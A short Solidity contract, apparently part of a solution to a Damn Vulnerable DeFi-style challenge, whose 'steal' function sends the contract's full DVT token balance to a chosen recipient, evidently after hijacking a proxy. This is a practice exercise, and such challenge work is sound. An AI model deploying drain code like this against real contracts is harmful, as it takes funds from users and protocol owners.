// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SendThemBack {
  
    // Putting the DVT contract instance in general storage made the 
    // proxy very angry.
    function steal(address recipient) external {
        ERC20 dvt = ERC20(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        uint256 balance = dvt.balanceOf(address(this));
        dvt.transfer(recipient, balance);
    }
}
